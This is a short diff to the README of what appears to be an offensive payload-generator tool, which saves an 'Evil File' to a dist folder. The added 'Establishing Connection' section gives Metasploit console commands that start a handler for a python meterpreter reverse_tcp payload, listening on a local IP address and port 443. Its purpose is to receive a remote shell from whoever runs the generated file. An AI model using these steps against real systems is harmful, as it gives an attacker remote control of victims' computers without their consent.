@@ -145,6 +145,17 @@ Note: You can also use our custom icons from the icon folder, just use them like
 
 ## Note:- Evil File will be saved inside dist/ folder, inside technowhorse/ folder
 
+## Establishing Connection
+
+* Recommended Settings, You can try to test it with any other payload in line 2
+```
+msf3> use exploit/multi/handler
+msf3> set payload python/meterpreter/reverse_tcp
+msf3> set LHOST 192.168.43.221
+msf3> set LPORT 443
+msf3> run
+```
+
 ## How to Update
 
 * Run updater.py to Update Autmatically or Download the latest Zip from this GitHub repo
